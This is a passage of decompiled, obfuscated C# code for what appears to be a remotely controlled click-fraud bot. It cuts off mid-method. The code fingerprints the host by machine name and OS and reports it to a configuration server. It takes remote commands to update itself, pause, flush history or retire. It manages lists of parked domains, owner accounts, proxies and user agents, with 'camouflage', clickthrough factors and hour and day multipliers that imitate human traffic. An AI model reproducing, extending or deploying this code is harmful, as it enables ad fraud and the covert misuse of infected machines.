using System;
using System.Collections;
using System.Globalization;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security;
using System.Text;
using System.Xml;
using Microsoft.Win32;

internal class Class11
{
	public const string string_0 = "yyyy-MM-dd HH:mm:ss";

	public Assembly assembly_0 = null;

	public Class34[] class34_0 = null;

	public Class5[] class5_0 = null;

	public Class37[] class37_0 = null;

	public Class35[] class35_0 = null;

	public Class38 class38_0 = new Class38();

	public Class33[] class33_0 = null;

	public IDictionary idictionary_0 = null;

	public IDictionary idictionary_1 = null;

	public IDictionary idictionary_2 = null;

	public Class26 class26_0;

	public Class40 class40_0 = null;

	public Queue queue_0 = null;

	public int int_0 = 50;

	public double[] double_0 = null;

	public double[] double_1 = null;

	protected Queue queue_1 = new Queue();

	public TimeSpan timeSpan_0 = TimeSpan.FromMinutes(5.0);

	public TimeSpan timeSpan_1 = TimeSpan.FromMinutes(1.0);

	public bool bool_0 = true;

	public bool bool_1 = true;

	public bool bool_2 = false;

	public DateTime dateTime_0 = DateTime.MinValue;

	public DateTime dateTime_1 = DateTime.MinValue;

	public int int_1 = 0;

	public int int_2 = 0;

	public string string_1 = "US";

	public bool bool_3 = true;

	public double double_2 = 0.05;

	public double double_3 = 1.0;

	public double double_4 = 1.0;

	public double double_5 = 1.0;

	public double double_6 = 1.0;

	public int int_3 = 1;

	public bool bool_4 = false;

	public TimeSpan timeSpan_2 = TimeSpan.FromHours(24.0);

	public TimeSpan timeSpan_3 = TimeSpan.FromHours(2.0);

	public DateTime dateTime_2 = DateTime.MinValue;

	public DateTime dateTime_3 = DateTime.MinValue;

	public DateTime dateTime_4 = DateTime.MinValue;

	public DateTime dateTime_5 = DateTime.MinValue;

	public DateTime dateTime_6 = DateTime.MinValue;

	public DateTime dateTime_7 = DateTime.MinValue;

	public TimeSpan timeSpan_4 = TimeSpan.FromHours(1.0);

	public DateTime dateTime_8 = DateTime.MinValue;

	public string string_2;

	public Guid guid_0 = Guid.Empty;

	public string string_3 = null;

	public string string_4 = "en-us";

	public Guid guid_1 = Guid.Empty;

	public string string_5 = "";

	public int int_4 = 3;

	public Enum0 enum0_0 = Enum0.Unspecified;

	public Class35 class35_1 = null;

	public string string_6;

	public Class40 class40_1;

	public bool bool_5 = false;

	public bool bool_6 = false;

	protected Class40 class40_2 = new Class40();

	protected int int_5 = 0;

	protected int int_6 = 0;

	protected DateTime dateTime_9 = DateTime.MinValue;

	public Class11()
	{
		assembly_0 = Assembly.GetAssembly(typeof(Class11));
		class26_0 = new Class26(this);
	}

	protected void method_0(bool bool_7)
	{
		if (bool_7)
		{
			bool_1 = true;
			bool_2 = false;
			int_1 = 0;
			int_2 = 0;
			bool_3 = true;
			dateTime_4 = DateTime.MinValue;
			dateTime_5 = DateTime.MinValue;
			dateTime_6 = DateTime.MinValue;
			dateTime_7 = DateTime.MinValue;
			dateTime_8 = DateTime.MinValue;
			dateTime_0 = DateTime.MinValue;
			try
			{
				string location = assembly_0.Location;
				DateTime dateTime;
				if ((dateTime = File.GetCreationTime(location)) > dateTime_0 || (dateTime = File.GetLastWriteTime(location)) > dateTime_0)
				{
					dateTime_0 = dateTime;
				}
			}
			catch (Exception exception_)
			{
				method_20("A31A1EB2-24A5-45e1-B5DC-336B3C6C8793", exception_);
				dateTime_0 = DateTime.MinValue;
			}
			dateTime_1 = dateTime_0;
			string_6 = Class3.string_11;
			class40_1 = Class40.smethod_0(string_6, " ");
		}
		int_0 = 50;
		timeSpan_0 = TimeSpan.FromMinutes(5.0);
		timeSpan_1 = TimeSpan.FromMinutes(1.0);
		bool_0 = true;
		string_1 = "US";
		double_2 = 0.05;
		double_3 = 1.0;
		double_5 = 1.0;
		double_6 = 1.0;
		int_3 = 1;
		bool_4 = false;
		timeSpan_2 = TimeSpan.FromHours(6.0);
		timeSpan_3 = TimeSpan.FromHours(2.0);
		dateTime_2 = DateTime.Now.Add(timeSpan_3);
		dateTime_3 = DateTime.Now.Add(timeSpan_2);
		timeSpan_4 = TimeSpan.FromHours(1.0);
		string_2 = assembly_0.GetName().Version!.ToString(2);
		guid_0 = Guid.Empty;
		string_3 = null;
		string_4 = "en-us";
		guid_1 = Guid.Empty;
		string_5 = "";
		int_4 = 3;
		class35_1 = null;
		bool_5 = false;
	}

	protected string method_1()
	{
		try
		{
			return Environment.MachineName;
		}
		catch (Exception exception_)
		{
			method_20("3AD5F4E2-0C62-4b2f-A6D9-99042C0D4857", exception_);
			return "";
		}
	}

	protected string method_2()
	{
		try
		{
			return Class51.smethod_8(Environment.OSVersion.Platform) + " " + Class51.smethod_8(Environment.OSVersion.Version);
		}
		catch (Exception exception_)
		{
			method_20("40C739FB-969C-45ff-87E6-B0E27B1302A5", exception_);
			return "";
		}
	}

	public string method_3()
	{
		return method_4(bool_7: false);
	}

	public string method_4(bool bool_7)
	{
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			XmlTextWriter xmlTextWriter = new XmlTextWriter(memoryStream, Class12.encoding_0);
			xmlTextWriter.Formatting = Formatting.Indented;
			xmlTextWriter.Indentation = 4;
			if (guid_1 == Guid.Empty)
			{
				guid_1 = Guid.NewGuid();
			}
			xmlTextWriter.WriteStartDocument();
			xmlTextWriter.WriteStartElement("Configuration");
			xmlTextWriter.WriteAttributeString("configurationHash", string_5);
			xmlTextWriter.WriteAttributeString("version", string_2);
			xmlTextWriter.WriteAttributeString("timestamp", Class51.smethod_14(DateTime.Now));
			xmlTextWriter.WriteElementString("ConfigurationUrl", class40_1.method_9(" "));
			xmlTextWriter.WriteElementString("CurrentReportId", Class51.smethod_8(guid_1));
			xmlTextWriter.WriteElementString("InstallationId", Class51.smethod_8(guid_0) + ((string_3 == null) ? "" : ("," + string_3)));
			xmlTextWriter.WriteElementString("DefaultEncoding", Class12.encoding_0.EncodingName);
			xmlTextWriter.WriteElementString("CurrentCulture", CultureInfo.CurrentCulture.ToString());
			xmlTextWriter.WriteElementString("NetworkId", method_1());
			xmlTextWriter.WriteElementString("OsVersion", method_2());
			xmlTextWriter.WriteElementString("Enabled", Class51.smethod_4(bool_1));
			xmlTextWriter.WriteElementString("DedicatedServer", Class51.smethod_4(bool_4));
			xmlTextWriter.WriteElementString("BatchSize", Class51.smethod_3(int_3));
			xmlTextWriter.WriteElementString("LastReport", Class51.smethod_14(dateTime_4));
			xmlTextWriter.WriteElementString("LastServerConfig", Class51.smethod_14(dateTime_5));
			xmlTextWriter.WriteElementString("LastPing", Class51.smethod_14(dateTime_6));
			xmlTextWriter.WriteElementString("RunningMode", Class51.smethod_8(enum0_0));
			xmlTextWriter.WriteElementString("LastUpdated", Class51.smethod_14(dateTime_0));
			xmlTextWriter.WriteElementString("LastUpdateAttempt", Class51.smethod_14(dateTime_1));
			xmlTextWriter.WriteElementString("TotalCycles", Class51.smethod_3(int_2));
			xmlTextWriter.WriteElementString("IdleCycles", Class51.smethod_3(int_1));
			if (bool_7)
			{
				xmlTextWriter.WriteElementString("Country", string_1);
				xmlTextWriter.WriteElementString("EnableCamouflage", Class51.smethod_4(bool_3));
				xmlTextWriter.WriteElementString("BrowserLanguage", string_4);
				xmlTextWriter.WriteElementString("MaxSuccessiveServerAttempts", Class51.smethod_3(int_4));
				xmlTextWriter.WriteElementString("MaxErrorCount", Class51.smethod_3(int_0));
				xmlTextWriter.WriteElementString("GlobalThrottle", Class51.smethod_2(double_4));
				xmlTextWriter.WriteElementString("GlobalMultiplier", Class51.smethod_2(double_3));
				xmlTextWriter.WriteElementString("GlobalClickthroughFactor", Class51.smethod_2(double_5));
				xmlTextWriter.WriteElementString("GlobalVolatilityFactor", Class51.smethod_2(double_6));
				xmlTextWriter.WriteElementString("AwakeningCycle", Class51.smethod_5(timeSpan_0));
				xmlTextWriter.WriteElementString("MinimumAwakeningCycle", Class51.smethod_5(timeSpan_1));
				xmlTextWriter.WriteElementString("DynamicAwakeningCycle", Class51.smethod_4(bool_0));
				xmlTextWriter.WriteElementString("Retire", Class51.smethod_4(bool_2));
				xmlTextWriter.WriteElementString("ReportingCycle", Class51.smethod_5(timeSpan_2));
				xmlTextWriter.WriteElementString("PingCycle", Class51.smethod_5(timeSpan_3));
				xmlTextWriter.WriteElementString("NextReport", Class51.smethod_14(dateTime_3));
				xmlTextWriter.WriteElementString("NextPing", Class51.smethod_14(dateTime_2));
				xmlTextWriter.WriteElementString("SaveConfigurationCycle", Class51.smethod_5(timeSpan_4));
				xmlTextWriter.WriteElementString("LastSaveConfiguration", Class51.smethod_14(dateTime_8));
				xmlTextWriter.WriteElementString("EligibilityExceptionProbability", Class51.smethod_2(double_2));
				xmlTextWriter.WriteElementString("LastConfigurationAttempt", Class51.smethod_14(dateTime_7));
			}
			xmlTextWriter.WriteElementString("Debug", "False");
			if (bool_7 && class26_0.class25_0 != null)
			{
				class26_0.class25_0.vmethod_0(xmlTextWriter);
			}
			xmlTextWriter.WriteStartElement("Parkings");
			if (class34_0 != null)
			{
				Class34[] array = class34_0;
				foreach (Class34 @class in array)
				{
					if (bool_7 || @class.bool_1)
					{
						@class.method_8(xmlTextWriter, bool_7);
					}
				}
			}
			xmlTextWriter.WriteEndElement();
			xmlTextWriter.WriteStartElement("Domains");
			if (class5_0 != null)
			{
				Class5[] array2 = class5_0;
				foreach (Class5 class2 in array2)
				{
					if (bool_7 || class2.bool_1)
					{
						class2.method_8(xmlTextWriter, bool_7);
					}
				}
			}
			xmlTextWriter.WriteEndElement();
			if (bool_7)
			{
				xmlTextWriter.WriteStartElement("OwnerAccounts");
				if (class33_0 != null)
				{
					Class33[] array3 = class33_0;
					foreach (Class33 class3 in array3)
					{
						class3.method_0(xmlTextWriter);
					}
				}
				xmlTextWriter.WriteEndElement();
				xmlTextWriter.WriteStartElement("Proxies");
				if (class35_0 != null)
				{
					Class35[] array4 = class35_0;
					foreach (Class35 class4 in array4)
					{
						class4.method_0(xmlTextWriter);
					}
				}
				xmlTextWriter.WriteEndElement();
				xmlTextWriter.WriteStartElement("UserAgents");
				if (class37_0 != null)
				{
					Class37[] array5 = class37_0;
					foreach (Class37 class5 in array5)
					{
						class5.method_0(xmlTextWriter);
					}
				}
				xmlTextWriter.WriteEndElement();
				xmlTextWriter.WriteStartElement("HourMultipliers");
				for (int j = 0; j < 24; j++)
				{
					xmlTextWriter.WriteStartElement("HourMultiplier");
					xmlTextWriter.WriteAttributeString("hour", Class51.smethod_3(j));
					xmlTextWriter.WriteString(Class51.smethod_2(double_1[j]));
					xmlTextWriter.WriteEndElement();
				}
				xmlTextWriter.WriteEndElement();
				xmlTextWriter.WriteStartElement("DayMultipliers");
				DayOfWeek[] array6 = new DayOfWeek[7]
				{
					DayOfWeek.Monday,
					DayOfWeek.Tuesday,
					DayOfWeek.Wednesday,
					DayOfWeek.Thursday,
					DayOfWeek.Friday,
					DayOfWeek.Saturday,
					DayOfWeek.Sunday
				};
				for (int k = 0; k < 7; k++)
				{
					xmlTextWriter.WriteStartElement("DayMultuplier");
					xmlTextWriter.WriteAttributeString("day", Class51.smethod_8(array6[k]));
					xmlTextWriter.WriteString(Class51.smethod_2(double_0[(int)array6[k] % 7]));
					xmlTextWriter.WriteEndElement();
				}
				xmlTextWriter.WriteEndElement();
			}
			xmlTextWriter.WriteStartElement("Errors");
			foreach (Class13 item in queue_1)
			{
				item.method_0(xmlTextWriter);
			}
			xmlTextWriter.WriteEndElement();
			class38_0.method_2(xmlTextWriter);
			xmlTextWriter.WriteEndElement();
			xmlTextWriter.WriteEndDocument();
			xmlTextWriter.Flush();
			xmlTextWriter.Close();
			return Class12.encoding_0.GetString(memoryStream.ToArray());
		}
		catch (Exception exception_)
		{
			method_20("6636D387-0505-4416-966E-863E5CFD78CC", exception_);
			return null;
		}
	}

	public bool method_5(string string_7, Class12 class12_0)
	{
		try
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(string_7);
			if (xmlDocument.DocumentElement!.Name == "Configuration")
			{
				return method_7(xmlDocument.DocumentElement, class12_0);
			}
			return false;
		}
		catch (Exception exception_)
		{
			method_20("79EF1019-1D6E-475f-AA4D-12BDE81C1B86", exception_);
			return false;
		}
	}

	public bool method_6(XmlNode xmlNode_0)
	{
		Class12 class12_ = new Class12(this);
		return method_7(xmlNode_0, class12_);
	}

	public bool method_7(XmlNode xmlNode_0, Class12 class12_0)
	{
		if (Class53.hashtable_2 == null)
		{
			Class53.hashtable_2 = new Hashtable(86, 0.5f)
			{
				{ "Enabled", 0 },
				{ "Pause", 1 },
				{ "EnableCamouflage", 2 },
				{ "MaxSuccessiveServerAttempts", 3 },
				{ "Country", 4 },
				{ "BrowserLanguage", 5 },
				{ "LastUpdated", 6 },
				{ "LastUpdateAttempt", 7 },
				{ "DefaultEncoding", 8 },
				{ "MaxErrorCount", 9 },
				{ "InstallationId", 10 },
				{ "AwakeningCycle", 11 },
				{ "MinimumAwakeningCycle", 12 },
				{ "DynamicAwakeningCycle", 13 },
				{ "DedicatedServer", 14 },
				{ "BatchSize", 15 },
				{ "ConfigurationUrl", 16 },
				{ "SaveConfigurationCycle", 17 },
				{ "NextReconfiguration", 18 },
				{ "NextReport", 19 },
				{ "NextPing", 20 },
				{ "ReportingCycle", 21 },
				{ "ReconfigurationCycle", 22 },
				{ "PingCycle", 23 },
				{ "EligibilityExceptionProbability", 24 },
				{ "GlobalThrottle", 25 },
				{ "GlobalMultiplier", 26 },
				{ "GlobalClickthroughFactor", 27 },
				{ "GlobalVolatilityFactor", 28 },
				{ "LastConfigurationAttempt", 29 },
				{ "TotalCycles", 30 },
				{ "IdleCycles", 31 },
				{ "AdHosts", 32 },
				{ "Parkings", 33 },
				{ "Domains", 34 },
				{ "VisitRecords", 35 },
				{ "Errors", 36 },
				{ "OwnerAccounts", 37 },
				{ "DayMultipliers", 38 },
				{ "HourMultipliers", 39 },
				{ "Proxies", 40 },
				{ "UserAgents", 41 },
				{ "Program", 42 }
			};
		}
		class12_0.method_2();
		if (xmlNode_0 != null)
		{
			string text = Class51.smethod_0(xmlNode_0, string_5, "configurationHash");
			if (text != null)
			{
				string_5 = text;
			}
			foreach (XmlNode childNode in xmlNode_0.ChildNodes)
			{
				if (Class51.smethod_1(childNode))
				{
					continue;
				}
				try
				{
					object name;
					if ((name = childNode.Name) != null && (name = Class53.hashtable_2[name]) != null)
					{
						switch ((int)name)
						{
						case 0:
							bool_1 = Class51.smethod_11(childNode.InnerText, bool_1);
							break;
						case 1:
							bool_1 = !Class51.smethod_11(childNode.InnerText, !bool_1);
							break;
						case 2:
							bool_3 = Class51.smethod_11(childNode.InnerText, bool_3);
							break;
						case 3:
							int_4 = Class51.smethod_9(childNode.InnerText, int_4);
							break;
						case 4:
							string_1 = childNode.InnerText;
							break;
						case 5:
							string_4 = childNode.InnerText;
							break;
						case 6:
							dateTime_0 = Class51.smethod_13(childNode.InnerText, dateTime_0);
							break;
						case 7:
							dateTime_1 = Class51.smethod_13(childNode.InnerText, dateTime_1);
							break;
						case 8:
						{
							string innerText = childNode.InnerText;
							if (innerText != Class12.encoding_0.EncodingName)
							{
								switch (innerText)
								{
								case "US-ASCII":
									Class12.encoding_0 = new ASCIIEncoding();
									break;
								case "Unicode":
									Class12.encoding_0 = new UnicodeEncoding();
									break;
								case "Unicode (UTF-7)":
									Class12.encoding_0 = new UTF7Encoding(allowOptionals: false);
									break;
								case "Unicode (UTF-8)":
									Class12.encoding_0 = new UTF8Encoding(encoderShouldEmitUTF8Identifier: false);
									break;
								default:
									method_21("81151CD9-4569-4891-A882-6626580480FF: " + innerText);
									break;
								}
							}
							break;
						}
						case 9:
							int_0 = Class51.smethod_9(childNode.InnerText, int_0);
							break;
						case 10:
							if (guid_0 == Guid.Empty)
							{
								ref Guid reference = ref guid_0;
								reference = new Guid(childNode.InnerText);
							}
							break;
						case 11:
							timeSpan_0 = Class51.smethod_12(childNode.InnerText, timeSpan_0);
							break;
						case 12:
							timeSpan_1 = Class51.smethod_12(childNode.InnerText, timeSpan_1);
							break;
						case 13:
							bool_0 = Class51.smethod_11(childNode.InnerText, bool_0);
							break;
						case 14:
							bool_4 = Class51.smethod_11(childNode.InnerText, bool_4);
							break;
						case 15:
							int_3 = Class51.smethod_9(childNode.InnerText, int_3);
							break;
						case 16:
							string_6 = childNode.InnerText;
							class40_1 = Class40.smethod_0(string_6, " ");
							break;
						case 17:
							timeSpan_4 = Class51.smethod_12(childNode.InnerText, timeSpan_4);
							break;
						case 18:
						case 19:
							dateTime_3 = Class51.smethod_13(childNode.InnerText, dateTime_3);
							break;
						case 20:
							dateTime_2 = Class51.smethod_13(childNode.InnerText, dateTime_2);
							break;
						case 21:
						case 22:
							timeSpan_2 = Class51.smethod_12(childNode.InnerText, timeSpan_2);
							break;
						case 23:
							timeSpan_3 = Class51.smethod_12(childNode.InnerText, timeSpan_3);
							break;
						case 24:
							double_2 = Class51.smethod_10(childNode.InnerText, double_2);
							break;
						case 25:
							double_4 = Class51.smethod_10(childNode.InnerText, double_4);
							break;
						case 26:
							double_3 = Class51.smethod_10(childNode.InnerText, double_3);
							break;
						case 27:
							double_5 = Class51.smethod_10(childNode.InnerText, double_5);
							break;
						case 28:
							double_6 = Class51.smethod_10(childNode.InnerText, double_6);
							break;
						case 29:
							dateTime_7 = Class51.smethod_13(childNode.InnerText, dateTime_7);
							break;
						case 30:
							int_2 = Class51.smethod_9(childNode.InnerText, int_2);
							break;
						case 31:
							int_1 = Class51.smethod_9(childNode.InnerText, int_1);
							break;
						case 32:
						case 33:
						{
							bool flag2 = false;
							if (class12_0.method_11(childNode, ref class34_0) && ((flag2 = childNode.Attributes!["subset"] == null || !Class51.smethod_11(childNode.Attributes!["subset"]!.Value, bool_0: false)) || idictionary_0 == null))
							{
								method_14();
							}
							if (flag2)
							{
								class5_0 = null;
								idictionary_1 = null;
								class33_0 = null;
								idictionary_2 = null;
							}
							break;
						}
						case 34:
						{
							bool flag = false;
							if (class12_0.method_9(childNode, ref class5_0) && ((flag = childNode.Attributes!["subset"] == null || !Class51.smethod_11(childNode.Attributes!["subset"]!.Value, bool_0: false)) || idictionary_1 == null))
							{
								method_13();
							}
							if (flag)
							{
								class33_0 = null;
								idictionary_2 = null;
							}
							break;
						}
						case 35:
							class12_0.method_12(childNode, ref class38_0);
							break;
						case 36:
						{
							Class13[] class13_ = null;
							class12_0.method_13(childNode, ref class13_);
							if (class13_ != null)
							{
								queue_1.Clear();
								method_32(class13_);
							}
							break;
						}
						case 37:
							class12_0.method_16(childNode);
							break;
						case 38:
							class12_0.method_18(childNode, ref double_0);
							break;
						case 39:
							class12_0.method_17(childNode, ref double_1);
							break;
						case 40:
							if (class12_0.method_15(childNode, ref class35_0, ref class35_1))
							{
								queue_0 = null;
							}
							break;
						case 41:
							if ((class37_0 == null || class37_0.Length == 0) && class12_0.method_14(childNode, ref class37_0))
							{
								class40_0 = null;
							}
							break;
						case 42:
							class26_0.method_3(childNode);
							break;
						}
					}
				}
				catch (Exception exception_)
				{
					method_20("2A970A8B-AA13-43f3-B9C8-1CBDBAD9F9EF: " + childNode.OuterXml, exception_);
				}
				if (bool_5)
				{
					break;
				}
			}
		}
		if (!bool_5)
		{
			method_10();
		}
		return true;
	}

	public bool method_8(XmlNode xmlNode_0)
	{
		Class12 class12_ = new Class12(this);
		return method_9(xmlNode_0, class12_);
	}

	public bool method_9(XmlNode xmlNode_0, Class12 class12_0)
	{
		foreach (XmlNode childNode in xmlNode_0.ChildNodes)
		{
			if (Class51.smethod_1(childNode))
			{
				continue;
			}
			try
			{
				switch (childNode.Name)
				{
				case "Update":
					try
					{
						bool flag = Class51.smethod_11(Class51.smethod_0(childNode, "false", "updateLoader"), bool_0: false);
						dateTime_1 = DateTime.Now;
						if (Class1.smethod_0(this, childNode.InnerText, flag))
						{
							bool_5 = true;
						}
						else
						{
							method_21("Failed to update the application!");
						}
					}
					catch (Exception exception_)
					{
						method_20("F6BC2491-0ADA-445d-A1EC-B53FC3D08A3B", exception_);
					}
					break;
				case "Flush":
				{
					bool bool_ = Class51.smethod_11(Class51.smethod_0(childNode, "false", "deleteHistory"), bool_0: true);
					bool bool_2 = Class51.smethod_11(Class51.smethod_0(childNode, "true", "purgeCurrent"), bool_0: true);
					method_33(class12_0, bool_2, bool_);
					break;
				}
				case "Report":
					dateTime_3 = Class51.smethod_13(childNode.InnerText, DateTime.Now);
					break;
				case "Pause":
					bool_1 = !Class51.smethod_11(childNode.InnerText, bool_0: true);
					break;
				case "Stop":
					bool_5 = true;
					break;
				case "Restart":
					bool_6 = true;
					bool_5 = true;
					break;
				case "Retire":
					this.bool_2 = Class51.smethod_11(childNode.InnerText, bool_0: true);
					bool_5 = true;
					break;
				default:
					method_21("Unknown command " + childNode.Name);
					break;
				}
				if (bool_5)
				{
					break;
				}
			}
			catch (Exception exception_2)
			{
				method_20("E9039F35-1066-4600-AD18-D4590E0D0CE1", exception_2);
			}
		}
		class12_0.method_4();
		return true;
	}

	protected bool method_10()
	{
		try
		{
			if (class34_0 == null)
			{
				class34_0 = new Class34[0];
			}
			if (idictionary_0 == null)
			{
				method_14();
			}
			if (class5_0 == null)
			{
				class5_0 = new Class5[0];
			}
			if (idictionary_1 == null)
			{
				method_13();
			}
			if (class33_0 == null)
			{
				ArrayList arrayList = new ArrayList();
				idictionary_2 = new Hashtable();
				Class5[] array = class5_0;
				foreach (Class5 @class in array)
				{
					try
					{
						if (!idictionary_2.Contains(@class.method_4()))
						{
							idictionary_2.Add(@class.method_4(), arrayList[arrayList.Add(new Class33(@class.string_3, @class.string_1, (@class.method_0() == null) ? Class34.timeSpan_1 : @class.method_0().method_4()))]);
						}
					}
					catch (Exception exception_)
					{
						method_20("C421A9FD-C0A5-4e7d-AA9F-CB33EEDF6865: " + @class.string_0, exception_);
					}
				}
				class33_0 = arrayList.ToArray(typeof(Class33)) as Class33[];
			}
			if (class37_0 == null)
			{
				class37_0 = Class12.class37_0;
				class40_0 = null;
			}
			if (class40_0 == null)
			{
				class40_0 = new Class40();
				Class37[] array2 = class37_0;
				foreach (Class37 class2 in array2)
				{
					class40_0.method_4(class2, class2.double_0);
				}
			}
			if (class35_0 == null)
			{
				class35_0 = new Class35[1] { class35_1 = new Class35() };
				queue_0 = null;
			}
			if (queue_0 == null)
			{
				queue_0 = new Queue(class35_0);
			}
			if (double_0 == null)
			{
				double_0 = new double[7];
				double_0[1] = 1.0;
				double_0[2] = 1.0;
				double_0[3] = 1.0;
				double_0[4] = 1.25;
				double_0[5] = 1.25;
				double_0[6] = 0.85;
				double_0[0] = 0.6;
			}
			if (double_1 == null)
			{
				double_1 = new double[24];
				double_1[0] = 0.4;
				double_1[1] = 0.4;
				double_1[2] = 0.3;
				double_1[3] = 0.3;
				double_1[4] = 0.2;
				double_1[5] = 0.3;
				double_1[6] = 0.6;
				double_1[7] = 0.85;
				double_1[8] = 1.0;
				double_1[9] = 1.0;
				double_1[10] = 1.0;
				double_1[11] = 1.25;
				double_1[12] = 1.25;
				double_1[13] = 1.0;
				double_1[14] = 1.0;
				double_1[15] = 1.0;
				double_1[16] = 1.0;
				double_1[17] = 1.0;
				double_1[18] = 1.25;
				double_1[19] = 1.25;
				double_1[20] = 1.0;
				double_1[21] = 0.85;
				double_1[22] = 0.6;
				double_1[23] = 0.5;
			}
		}
		catch (Exception exception_2)
		{
			method_20("E7BDD377-8323-4842-A413-126377C056A7", exception_2);
			return false;
		}
		return true;
	}

	protected bool method_11()
	{
		try
		{
			string location = assembly_0.Location;
			DateTime dateTime;
			if ((dateTime = File.GetCreationTime(location)) > dateTime_0 || (dateTime = File.GetLastWriteTime(location)) > dateTime_0)
			{
				dateTime_0 = dateTime;
			}
			return true;
		}
		catch (Exception exception_)
		{
			method_20("A31A1EB2-24A5-45e1-B5DC-336B3C6C8793", exception_);
			dateTime_0 = DateTime.MinValue;
			return false;
		}
	}

	public bool method_12()
	{
		try
		{
			Class12 @class = new Class12(this);
			method_0(bool_7: true);
			@class.method_8();
			@class.method_7();
			@class.method_1();
			method_11();
			method_6(null);
			method_38();
			return true;
		}
		catch (Exception exception_)
		{
			method_20("1074252E-8E56-485c-82C2-1FBC570A89FB", exception_);
			return false;
		}
	}

	protected void method_13()
	{
		idictionary_1 = new Hashtable();
		Class5[] array = class5_0;
		foreach (Class5 @class in array)
		{
			idictionary_1[@class.string_0] = @class;
		}
	}

	protected void method_14()
	{
		idictionary_0 = new Hashtable();
		Class34[] array = class34_0;
		foreach (Class34 @class in array)
		{
			idictionary_0[@class.string_0] = @class;
		}
	}

	public void method_15(Class12 class12_0)
	{
		try
		{
			guid_1 = Guid.NewGuid();
			if (class5_0 != null)
			{
				Class5[] array = class5_0;
				foreach (Class5 @class in array)
				{
					@class.int_0 = 0;
					@class.int_1 = 0;
					@class.int_2 = 0;
					@class.bool_1 = false;
				}
			}
			if (class34_0 != null)
			{
				Class34[] array2 = class34_0;
				foreach (Class34 class2 in array2)
				{
					class2.int_0 = 0;
					class2.int_1 = 0;
					class2.int_2 = 0;
					class2.bool_1 = false;
				}
			}
			class38_0.method_3();
			queue_1.Clear();
			int_2 = 0;
			int_1 = 0;
		}
		catch (Exception exception_)
		{
			method_20("A40C47B3-0719-49ba-83DC-C0E8FB429063", exception_);
		}
	}

	public void method_16()
	{
		try
		{
			Class9 @class = new Class9(this);
			if (@class.method_22())
			{
				dateTime_6 = DateTime.Now;
			}
		}
		catch (Exception exception_)
		{
			method_20("9B20B562-C668-405c-B192-60ADF759EDCF", exception_);
		}
		finally
		{
			dateTime_2 = DateTime.Now.Add(Class51.smethod_19(timeSpan_3, double_6));
		}
	}

	[SpecialName]
	public string method_17()
	{
		try
		{
			if (class40_0 != null)
			{
				return (class40_0.method_10() as Class37).string_0;
			}
			return null;
		}
		catch (Exception exception_)
		{
			method_20("F5E6D667-77D0-487a-B36A-4DA78C65B5AD", exception_);
			return null;
		}
	}

	public bool method_18()
	{
		Class12 @class = new Class12(this);
		return @class.method_4();
	}

	public void method_19(string string_7, string string_8, string string_9, string string_10, int int_7, Exception exception_0)
	{
		method_22(string_7, string_8, string_9, string_10, int_7, Class51.smethod_8(((object)exception_0).GetType()), Class51.smethod_8(exception_0));
	}

	public void method_20(string string_7, Exception exception_0)
	{
		method_19(null, null, null, null, -1, new Exception(string_7, exception_0));
	}

	public void method_21(string string_7)
	{
		method_23(null, null, null, null, -1, null, string_7);
	}

	protected void method_22(string string_7, string string_8, string string_9, string string_10, int int_7, string string_11, string string_12)
	{
		Class13 @class = new Class13();
		@class.dateTime_0 = DateTime.Now;
		@class.string_0 = string_7;
		@class.string_1 = string_8;
		@class.string_2 = string_10;
		@class.string_3 = string_9;
		@class.int_0 = int_7;
		@class.string_4 = string_11;
		@class.string_5 = string_12;
		method_31(@class);
	}

	public void method_23(string string_7, string string_8, string string_9, string string_10, int int_7, string string_11, string string_12)
	{
		method_22(string_7, string_8, string_9, string_10, int_7, string_11, string_12);
	}

	public Class5 method_24()
	{
		try
		{
			method_25(bool_7: false);
			if (class40_2.System_002ECollections_002EICollection_002ECount > 0)
			{
				Class5 @class = class40_2.method_10() as Class5;
				@class.dateTime_1 = DateTime.Now + @class.method_0().method_5();
				return @class;
			}
			return null;
		}
		catch (Exception exception_)
		{
			method_20("CC9A8788-3F21-4aab-8139-90F94211E7B5", exception_);
			return null;
		}
	}

	protected Class40 method_25(bool bool_7)
	{
		int_6 = 0;
		int_5 = 0;
		class40_2.method_8();
		IDictionary dictionary = new Hashtable();
		IDictionary dictionary2 = new Hashtable();
		if (DateTime.Now < dateTime_9)
		{
			if (bool_7)
			{
				return null;
			}
			return method_26(ref class40_2);
		}
		if (class5_0.Length > 0)
		{
			dateTime_9 = DateTime.MaxValue;
			DateTime now = DateTime.Now;
			Class5[] array = class5_0;
			foreach (Class5 @class in array)
			{
				if (!@class.method_6())
				{
					continue;
				}
				if (now < @class.dateTime_1)
				{
					if (@class.dateTime_1 < dateTime_9)
					{
						dateTime_9 = @class.dateTime_1;
					}
					continue;
				}
				Class34 class2 = @class.method_0();
				DateTime dateTime = class2.dateTime_0 + class2.method_3();
				if (now >= dateTime)
				{
					if (!dictionary2.Contains(class2.string_0))
					{
						dictionary2.Add(class2.string_0, class2);
					}
					Class33 class3 = @class.method_5();
					dateTime = class3.dateTime_0 + class2.method_4();
					if (now >= dateTime)
					{
						if (!dictionary.Contains(class3.string_0))
						{
							dictionary.Add(class3.string_0, class3);
						}
						dateTime = @class.dateTime_0 + class2.method_5();
						if (now >= dateTime)
						{
							class40_2.method_4(@class, @class.double_1);
						}
					}
				}
				if (dateTime < dateTime_9)
				{
					dateTime_9 = dateTime;
				}
			}
			int_5 = dictionary2.Count;
			int_6 = dictionary.Count;
			if (class40_2.System_002ECollections_002EICollection_002ECount == 0)
			{
				method_26(ref class40_2);
			}
		}
		return class40_2;
	}

	protected Class40 method_26(ref Class40 class40_3)
	{
		if (class5_0.Length > 0 && Class51.random_0.NextDouble() < double_2)
		{
			Class5 @class = class5_0[Class51.random_0.Next(0, class5_0.Length - 1)];
			int num = 0;
			while (!@class.method_6() && num++ < 3)
			{
				@class = class5_0[Class51.random_0.Next(0, class5_0.Length - 1)];
			}
			if (@class.method_6())
			{
				class40_3.method_4(@class, 1.0);
			}
		}
		return class40_3;
	}

	public IWebProxy method_27()
	{
		return method_28(class35_1);
	}

	protected IWebProxy method_28(Class35 class35_2)
	{
		WebProxy webProxy = null;
		try
		{
			if (class35_2 == null)
			{
				class35_2 = new Class35();
			}
			if (class35_2.string_0 != "")
			{
				webProxy = new WebProxy(class35_2.string_0, BypassOnLocal: true);
			}
			else
			{
				webProxy = WebProxy.GetDefaultProxy();
				webProxy.BypassProxyOnLocal = true;
			}
			if (class35_2.string_1 != null && class35_2.string_1 != "")
			{
